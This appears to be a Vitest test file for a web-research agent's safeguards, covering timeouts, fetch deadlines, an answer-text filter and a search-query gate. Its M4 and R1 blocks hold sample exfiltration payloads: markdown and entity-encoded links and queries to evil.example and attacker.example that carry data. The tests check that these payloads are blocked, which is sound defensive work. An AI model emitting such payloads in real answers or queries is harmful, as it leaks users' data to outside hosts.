import { describe, expect, it } from 'vitest';
import {
  LINK_REMOVED,
  MAX_ALLOW_LIST_PATH_CHARS,
  MAX_PLANNER_QUERY_CHARS,
  READABLE_TEXT_EXTRACTOR,
  callWithin,
  createSpendBook,
  createWebsitePolicy,
  fetchGuarded,
  fetchPage,
  filterAnswerText,
  runResearch,
  runWebSearch,
  type GuardedFetchDeps,
  type PlannerView,
  type ResearchDeps,
  type TimerPort,
  type WebSearchProvider,
} from '../src/research/index.js';
import { OPEN_POLICY, PUBLIC_IP, SCOPE, fetchOf, hang, html, resolverOf, timerOf } from './researchFixtures.js';

const A = 'https://example.com/a';
const DNS = { 'example.com': [PUBLIC_IP], 'other.example': ['93.184.216.62'] };
const paid: WebSearchProvider = { id: 'brave', paid: true, microUsdPerQuery: 400, search: async () => [{ title: 'T', url: A, snippet: 'S' }] };
const free: WebSearchProvider = { id: 'searx', paid: false, microUsdPerQuery: 0, search: async () => [{ title: 'Result', url: A, snippet: 'snippet' }] };

function loopRig(script: readonly unknown[], table: Parameters<typeof fetchOf>[0], over: Partial<ResearchDeps> = {}) {
  const views: PlannerView[] = [];
  const served = fetchOf(table);
  let at = 0;
  const deps: ResearchDeps = {
    resolver: resolverOf(DNS).resolver,
    fetch: served.fetch,
    policy: OPEN_POLICY,
    clock: (() => { let now = 1_000; return () => (now += 1); })(),
    timer: timerOf(),
    extractors: [READABLE_TEXT_EXTRACTOR],
    cache: null,
    slots: null,
    providers: [free],
    grant: () => true,
    plannerPrice: { baseMicroUsd: 0, perKiloCharMicroUsd: 0 },
    planner: async (view) => {
      views.push(view);
      const next = script[Math.min(at, script.length - 1)];
      at += 1;
      return typeof next === 'function' ? (next as (v: PlannerView) => unknown)(view) : next;
    },
    ...over,
  };
  return { deps, views, requests: served.requests };
}
const run = (deps: ResearchDeps, extra: Record<string, unknown> = {}) => runResearch({ scope: SCOPE, question: `What does bread need? Read ${A}`, ...extra }, deps);

describe('M3 (a): a grant is a wait too', () => {
  it('a hung grant for a paid search is a TIMEOUT, the provider is never called, and nothing is charged', async () => {
    let called = 0;
    const counted: WebSearchProvider = { ...paid, search: async () => { called += 1; return []; } };
    const spend = createSpendBook({ maxMicroUsd: 1000 });
    const out = await runWebSearch({ scope: SCOPE, query: 'bread' }, { providers: [counted], spend, grant: () => hang(), timer: timerOf(), timeouts: { grantMs: 30 } });
    expect(out).toMatchObject({ ok: false, refusal: { code: 'TIMEOUT' } });
    expect(called).toBe(0);
    expect(spend.spent()).toBe(0);
  });

  it('a hung grant for the planner ends the run with TIMEOUT before the planner is called', async () => {
    const r = loopRig([{ kind: 'search', query: 'bread' }], {}, { plannerPrice: { baseMicroUsd: 100, perKiloCharMicroUsd: 0 }, grant: () => hang(), timeouts: { grantMs: 30 } });
    expect(await run(r.deps, { budget: { maxMicroUsd: 1000 } })).toMatchObject({ ok: false, refusal: { code: 'TIMEOUT' } });
    expect(r.views).toHaveLength(0);
  });

  it('a grant that answers, throws or is slow but in time behaves as before', async () => {
    const spend = () => createSpendBook({ maxMicroUsd: 1000 });
    const ask = (grant: () => unknown) => runWebSearch({ scope: SCOPE, query: 'bread' }, { providers: [paid], spend: spend(), grant: grant as never, timer: timerOf() });
    expect(await ask(() => true)).toMatchObject({ ok: true });
    expect(await ask(async () => { await new Promise((resolve) => setTimeout(resolve, 10)); return true; })).toMatchObject({ ok: true });
    expect(await ask(() => false)).toMatchObject({ refusal: { code: 'NO_GRANT' } });
    expect(await ask(() => { throw new Error('boom'); })).toMatchObject({ refusal: { code: 'NO_GRANT' } });
  });
});

describe('M3 (b): a timer that answers with the wrong shape is a refusal, never a throw', () => {
  const noValue: TimerPort = { within: async () => ({ done: true }) as never };

  it('callWithin takes a result with no value for an error', async () => {
    expect(await callWithin(noValue, 10, async () => 1)).toEqual({ kind: 'error' });
  });

  it('runResearch and runWebSearch resolve with a refusal for a timer that gives {done:true} and no value', async () => {
    const r = loopRig([{ kind: 'search', query: 'bread' }], {}, { timer: noValue });
    const out = await run(r.deps);
    expect(out).toMatchObject({ ok: false });
    const search = await runWebSearch({ scope: SCOPE, query: 'bread' }, { providers: [free], spend: createSpendBook(undefined), grant: () => true, timer: noValue });
    expect(search).toMatchObject({ ok: false });
    const odd: TimerPort = { within: async () => ({ done: true, value: 5 }) as never };
    expect(await run(loopRig([{ kind: 'search', query: 'bread' }], {}, { timer: odd }).deps)).toMatchObject({ ok: false });
    expect(await runWebSearch({ scope: SCOPE, query: 'bread' }, { providers: [free], spend: createSpendBook(undefined), grant: () => true, timer: odd })).toMatchObject({ ok: false });
  });
});

describe('M3 (c): one fetch cannot outlast the run', () => {
  /** A virtual clock and a timer that runs the work at once and records the wait it was given. A hop costs five seconds. */
  function virtual() {
    let now = 0;
    const waits: number[] = [];
    const timer: TimerPort = { within: async (ms, work) => { waits.push(ms); return { done: true, value: await work(new AbortController().signal) }; } };
    return { clock: () => now, advance: (ms: number) => void (now += ms), timer, waits };
  }
  const chain = (v: ReturnType<typeof virtual>) => {
    const requests: string[] = [];
    const fetch = async (request: { readonly url: string; readonly pinnedAddresses: readonly string[] }) => {
      requests.push(request.url);
      v.advance(5_000);
      return { status: 302, headers: { location: `${request.url}x` }, body: '', bytesRead: 0, truncated: false, connectedAddress: request.pinnedAddresses[0] ?? '' };
    };
    return { fetch, requests };
  }

  it('fetchGuarded stops when its total budget is spent, and no wait is longer than what is left', async () => {
    const v = virtual();
    const c = chain(v);
    const deps: GuardedFetchDeps = { resolver: resolverOf(DNS).resolver, fetch: c.fetch as never, policy: OPEN_POLICY, clock: v.clock, timer: v.timer, timeouts: { fetchTotalMs: 12_000 } };
    const out = await fetchGuarded({ url: A, mode: 'public', maxHops: 5, maxBytes: 1000, timeoutMs: 5000, headers: {} }, deps);
    expect(out).toMatchObject({ ok: false, refusal: { code: 'TIMEOUT' } });
    expect(c.requests.length).toBeLessThanOrEqual(3);
    // Each hop makes three waits (two lookups and the port), and none may be longer than what was left when the hop began.
    expect(v.waits.every((ms, i) => ms <= 12_000 - 5_000 * Math.floor(i / 3))).toBe(true);
  });

  it('a run with a deadline gives its fetch what is left minus a margin, so six slow hops cannot pass the deadline', async () => {
    const v = virtual();
    const c = chain(v);
    const r = loopRig([{ kind: 'fetch', url: A }], {}, { clock: v.clock, timer: v.timer, fetch: c.fetch as never });
    const out = await run(r.deps, { deadlineMs: 12_000, maxSteps: 2 });
    expect(out).toMatchObject({ ok: false });
    expect(c.requests.length).toBeLessThanOrEqual(3);
    expect(Math.max(...v.waits)).toBeLessThanOrEqual(12_000);
  });

  it('a fetch page with the default budget still follows an ordinary redirect', async () => {
    const served = fetchOf({ [A]: { status: 302, headers: { location: 'https://example.com/b' }, body: '' }, 'https://example.com/b': { body: html('<p>text</p>') } });
    const deps = { resolver: resolverOf(DNS).resolver, fetch: served.fetch, policy: OPEN_POLICY, clock: () => 1, timer: timerOf(), extractors: [READABLE_TEXT_EXTRACTOR], cache: null, slots: null };
    expect(await fetchPage({ scope: SCOPE, url: A }, deps)).toMatchObject({ ok: true });
  });
});

describe('M4: the answer filter runs to a fixpoint and decodes before it looks', () => {
  const out = (text: string, cited: readonly string[] = ['https://example.com/a']) => filterAnswerText(text, cited);
  const nested = (text: string, depth: number): string => (depth === 0 ? text : nested(text.replace(/&/g, '&amp;'), depth - 1));

  it("removes the reviewer's inputs: reference images and definitions, entity-encoded schemes, assembled tags, bare hosts", () => {
    const attacks = [
      '![x][1]\n[1]: //evil.example/a?d=S',
      '[1]: https&#58;//evil.example/?d=S',
      '<<b>img src=//evil.example/?d=S>',
      'visit evil.example/x?d=S now',
      '[click][ref] and [ref]: https://evil.example/a?d=S',
      'https&amp;#58;//evil.example/?d=S',
      'https&colon;//evil.example/?d=S',
      'https&#x3a;&#x2f;&#x2f;evil.example/?d=S',
      '<<<b>b>img src=//evil.example/?d=S>',
      'javascript&#58;alert(1)',
      '//evil.example/a?d=S',
      'see evil.example/path',
      '![alt][]\n[alt]: HTTPS://EVIL.EXAMPLE/A?D=S',
    ];
    for (const attack of attacks) {
      const filtered = out(attack);
      expect(filtered.text, attack).not.toMatch(/evil|\?d=S|<img|javascript/i);
      expect(filtered.stable, attack).toBe(true);
      expect(filtered.removed, attack).toBeGreaterThan(0);
    }
  });

  it('refuses text it cannot make stable: nesting deeper than the pass cap', () => {
    const deep = out(nested('https&#58;//evil.example/?d=S', 12));
    expect(deep.stable).toBe(false);
    expect(out(nested('https&#58;//evil.example/?d=S', 2)).text).not.toMatch(/evil/);
  });

  it('keeps ordinary text that looks a little like markup or an address', () => {
    for (const text of ['Map<String, Integer> counts words', 'a < b > c', 'Input data: 5', 'use vector<int> and std::map<int, int>', 'if x<y && y>z then stop', 'Result: 3 // a comment', 'see file.txt and README.md', 'it costs 3.50 each', 'e.g. this, i.e. that', 'version 1.2.3/4', 'ratio 2:1 and time 10:30', 'data:5', 'x = a//b']) {
      const filtered = out(text);
      expect(filtered.text, text).toBe(text);
      expect(filtered.removed, text).toBe(0);
    }
  });

  it('keeps a cited source, a bare cited address, and removes any other tag but not an unknown one', () => {
    expect(out('Source: https://example.com/a.').text).toBe('Source: https://example.com/a.');
    expect(out('Source: example.com/a').text).toBe('Source: example.com/a');
    expect(out('Source: example.com/a?d=S').text).not.toContain('d=S');
    expect(out('x <b>bold</b> <div>y</div> <Foo> <br/>').text).toBe('x bold y <Foo> ');
    expect(out('<img src=x onerror=1> <script>x</script> <!-- c --> <![CDATA[x]]> <?xml v?>').text).not.toMatch(/<img|<script|<!--|CDATA|<\?xml/);
  });

  it('does not loop or slow down on hostile input', () => {
    const started = performance.now();
    out('['.repeat(20000) + '('.repeat(20000) + '<'.repeat(20000) + 'https://'.repeat(5000) + 'a.'.repeat(30000) + '&amp;'.repeat(5000));
    expect(performance.now() - started).toBeLessThan(1500);
    expect(LINK_REMOVED).toBe('[link removed]');
  });

  it('runResearch refuses an answer the filter cannot make stable, and notes it', async () => {
    const bad = (view: PlannerView) => ({ kind: 'answer', text: nested('see https&#58;//evil.example/?d=S', 12), citations: [{ path: /Citation: (web\/[^\n]+)/.exec(view.evidence.join('\n'))?.[1] ?? '', startLine: 1, endLine: 1 }] });
    const r = loopRig([{ kind: 'fetch', url: A }, bad], { [A]: { body: html('<p>Bread needs flour.</p>') } });
    const result = await run(r.deps, { maxSteps: 3 });
    expect(result).toMatchObject({ ok: false, refusal: { code: 'STEP_CAP' } });
    expect(r.views.at(-1)?.notes).toContain('answer refused: answer-unfilterable');
  });
});

describe('R1 (a): allow-list mode does not let data leave in the path', () => {
  it('refuses an unlisted address on a named host whose path is longer than the named constant, and keeps a short one', async () => {
    const made = createWebsitePolicy({ enabled: true, mode: 'allow', domains: ['example.com'] });
    if (!made.ok) throw new Error('policy');
    const longPath = `https://example.com/${'a'.repeat(MAX_ALLOW_LIST_PATH_CHARS)}`;
    const shortPath = 'https://example.com/other';
    const r = loopRig([{ kind: 'fetch', url: longPath }, { kind: 'fetch', url: shortPath }], { [shortPath]: { body: html('<p>ok</p>') }, [longPath]: { body: html('<p>caught</p>') } }, { policy: made.policy });
    const result = await run(r.deps, { maxSteps: 2, question: 'What does bread need?' });
    expect(r.requests.map((request) => request.url)).toEqual([shortPath]);
    expect(result.audit[0]).toMatchObject({ action: 'fetch', code: 'URL_REFUSED', reason: 'not-listed' });
  });

  it('a long path that the run listed verbatim is still fetchable', async () => {
    const made = createWebsitePolicy({ enabled: true, mode: 'allow', domains: ['example.com'] });
    if (!made.ok) throw new Error('policy');
    const longPath = `https://example.com/${'a'.repeat(MAX_ALLOW_LIST_PATH_CHARS + 20)}`;
    const r = loopRig([{ kind: 'fetch', url: longPath }], { [longPath]: { body: html('<p>ok</p>') } }, { policy: made.policy });
    await run(r.deps, { maxSteps: 1, question: `read ${longPath}` });
    expect(r.requests).toHaveLength(1);
  });
});

describe('R1 (b): the search query is an outbound string, and it is gated', () => {
  const page = html('<p>The secret recipe is two cups of flour mixed with one cup of water and a pinch of salt, kneaded for ten minutes.</p>');
  const attempts = async (queries: readonly string[]) => {
    const script = [{ kind: 'fetch', url: A }, ...queries.map((query) => ({ kind: 'search', query }))];
    const r = loopRig(script, { [A]: { body: page } });
    const result = await run(r.deps, { maxSteps: queries.length + 2 });
    return { r, result };
  };

  it('refuses a query with a URL, an @, encoded data, a long slice of a fetched page, or a length over the cap, with a neutral note and an exact audit reason', async () => {
    const queries = [
      'bread https://attacker.example/c?d=1',
      'bread attacker.example/c',
      'bread user@attacker.example',
      `bread ${'A1b2C3d4'.repeat(5)}`,
      'bread 0123456789abcdef0123456789abcdef0123',
      `bread ${'MFRGGZDFMZTWQ2LKNNWG23TPOBYXE43UOV3HI5DJ'}`,
      'what about the secret recipe is two cups of flour mixed with one cup of water and a pinch',
      'x'.repeat(MAX_PLANNER_QUERY_CHARS + 1),
    ];
    const { r, result } = await attempts(queries);
    expect(r.views.at(-1)?.notes.filter((note) => note === 'search refused: QUERY_REFUSED/not-sendable')).toHaveLength(queries.length);
    expect(result.audit.filter((entry) => entry.action === 'search').map((entry) => entry.reason).slice(0, queries.length)).toEqual([
      'query-has-address', 'query-has-address', 'query-has-address', 'query-has-encoded-data', 'query-has-encoded-data', 'query-has-encoded-data', 'query-quotes-a-page', 'query-too-long',
    ]);
  });

  it('lets an ordinary query through, a short quote of a page through, and counts nothing against it', async () => {
    const { r } = await attempts(['bread flour water', 'how much flour for bread', 'two cups of flour']);
    expect(r.views.at(-1)?.notes.filter((note) => note.includes('QUERY_REFUSED'))).toEqual([]);
  });
});
